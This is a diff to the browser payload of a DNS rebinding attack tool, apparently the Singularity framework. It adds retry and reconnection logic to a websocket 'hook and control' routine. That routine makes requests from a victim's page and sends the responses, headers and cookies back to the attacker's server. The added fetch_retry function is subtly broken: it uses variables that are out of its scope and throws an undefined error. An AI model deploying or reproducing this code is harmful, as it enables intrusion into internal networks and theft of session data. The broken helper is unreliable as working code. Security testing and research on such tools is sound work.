@@ -132,7 +132,7 @@ const Rebinder = () => {
     }
 }
 
-function timeout(ms, promise,controller) {
+function timeout(ms, promise, controller) {
     return new Promise(function (resolve, reject) {
         setTimeout(function () {
             controller.abort();
@@ -151,13 +151,55 @@ function begin(url) {
     r.init(url, attack);
 }
 
+
+function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }
+
+const fetch_retry = (url, options, n) => fetch(url, options)
+    .then(function (r) {
+        let fetchResponse = {
+            "id": messageID,
+            "command": "fetchResponse",
+            "response": {},
+            "body": "",
+        }
+        fetchResponse.response.headers = r.headers;
+        fetchResponse.response.ok = r.ok;
+        fetchResponse.response.redirected = r.redirected;
+        fetchResponse.response.status = r.status;
+        fetchResponse.response.type = r.type;
+        fetchResponse.response.url = r.url;
+        fetchResponse.response.body = r.body;
+        fetchResponse.response.bodyUsed = r.bodyUsed;
+        fetchResponse.response.headers = {};
+        for (let pair of r.headers.entries()) {
+            fetchResponse.response.headers[pair[0]] = pair[1];
+        };
+        fetchResponse.response.cookies = getCookies();
+        return r.arrayBuffer()
+    })
+    .then(function (result) {
+        fetchResponse.body = base64ArrayBuffer(result);
+        ws.send(JSON.stringify(fetchResponse));
+    }).catch(function (e) {
+        console.log(`Hook and Command Fetch failed for frame ${window.location}: ${e}`);
+        if (n === 1) throw error;
+        return fetch_retry(url, options, n - 1);
+    });;
+
 // Request target to establish a websocket to Singularity server and wait for commands
-function webSocketHook(initialCookie) {
+// Implements retries to handle multiple answer strategy and firewall blocks.
+function webSocketHook(initialCookie, retry) {
+    if (retry < 0) {
+        console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
+        return;
+    }
     const serverIp = document.location.hostname.split('-')[1]
+    //TKTK hard code port for hook and control and multiple answer strategy
     const wsurl = document.location.port ? `${serverIp}:${document.location.port}` :
         `${serverIp}`;
 
-    var ws = new WebSocket(`ws://${wsurl}/soows`);
+    let ws = new WebSocket(`ws://${wsurl}/soows`);
+
     ws.onmessage = function (m) {
         const data = JSON.parse(m.data);
         if (data.command === 'fetch') {
@@ -167,42 +209,22 @@ function webSocketHook(initialCookie) {
                 data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
             }
             const messageID = data.payload.fetchrequest.id
-            let fetchResponse = {
-                "id": messageID,
-                "command": "fetchResponse",
-                "response": {},
-                "body": "",
-            }
-            fetch(data.payload.url, data.payload.fetchrequest)
-                .then(function (r) {
-                    fetchResponse.response.headers = r.headers;
-                    fetchResponse.response.ok = r.ok;
-                    fetchResponse.response.redirected = r.redirected;
-                    fetchResponse.response.status = r.status;
-                    fetchResponse.response.type = r.type;
-                    fetchResponse.response.url = r.url;
-                    fetchResponse.response.body = r.body;
-                    fetchResponse.response.bodyUsed = r.bodyUsed;
-                    fetchResponse.response.headers = {};
-                    for (let pair of r.headers.entries()) {
-                        fetchResponse.response.headers[pair[0]] = pair[1];
-                    };
-                    fetchResponse.response.cookies = getCookies();
-                    return r.arrayBuffer()
-                })
-                .then(function (result) {
-                    fetchResponse.body = base64ArrayBuffer(result);
-                    ws.send(JSON.stringify(fetchResponse));
-                }).catch(function (e) {
-                    console.log(e);
-                });
+            fetch_retry(data.payload.url, data.payload.fetchrequest, 10);
         }
-
     }
     ws.onopen = function (evt) { }
     ws.onerror = function (e) {
         console.log(`WS error: ${e}`);
     }
+
+    wait(1000)
+        .then(() => {
+            if (ws.readyState !== 1) {
+                webSocketHook(initialCookie, retry - 1);
+            } else {
+                console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
+            }
+        })
 }
 
 function buildCookie(val, days) {
@@ -242,7 +264,6 @@ Permission is hereby granted, free of charge, to any person obtaining a copy of 
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
-
 
 function base64ArrayBuffer(arrayBuffer) {
     var base64 = ''
